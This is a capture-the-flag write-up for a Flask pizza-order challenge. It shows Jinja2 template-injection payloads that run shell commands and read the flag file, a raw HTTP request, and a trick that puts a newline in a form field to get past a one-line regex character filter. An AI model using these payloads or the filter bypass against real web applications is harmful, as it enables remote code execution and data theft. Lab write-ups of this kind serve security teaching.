-   SSTI payloads

```python
# RCE
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Read flag
{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat$IFS/flag.txt').read()}}
```

```
POST /order HTTP/1.1
Host: kavi.local:1337
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: text/html,application/xhtml+xml,application/
xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 166
Origin: http://kavi.local:1337
Connection: close
Referer: http://kavi.local:1337/order
Upgrade-Insecure-Requests: 1

customer_name=
{{7*7)}}&pizza_name=Margherita&pizza_size=Small&topping=Mushrooms&sauce=Marinara
```

# Solution

1. Once you start doing code review using the given source code, you notice that there is a possible SSTI vulnerability due to using `render_teplate_string()` function unsafely.

```python
return render_template_string(
	"""
<p>Thank you, {}! Your order has been placed. Final price is ${} </p>
""".format(
		customer_name.split(" ")[0], str(final_price)
	)
)
```

2. But when you try to exploit it (`/order`) with a simple payload like `{{7*7}}`, we get an error saying `Invalid characters detected!`
3. Then we look at the code again to see that there is a check in the POST field to see it they contain any special characters.

```python
for item in [customer_name, pizza_name, pizza_size, topping, sauce]:
	m = re.match(
		r'.*[\!@#$%^&*()_+\-=[\]{};\'\\:"|,.<>/?`~].*', item, re.IGNORECASE
	)

	if m is not None:
		return """<p>Invalid characters detected!</p>"""
```

4. But since its using the `re.match()` and since it only does one-line matching, we can use multi-lines to bypass this : https://docs.python.org/3/library/re.html#re.match
5. So using a payload like below will bypass this and give us RCE

```
customer_name=
{{7*7)}}&pizza_name=Margherita&pizza_size=Small&topping=Mushrooms&sauce=Marinara
```
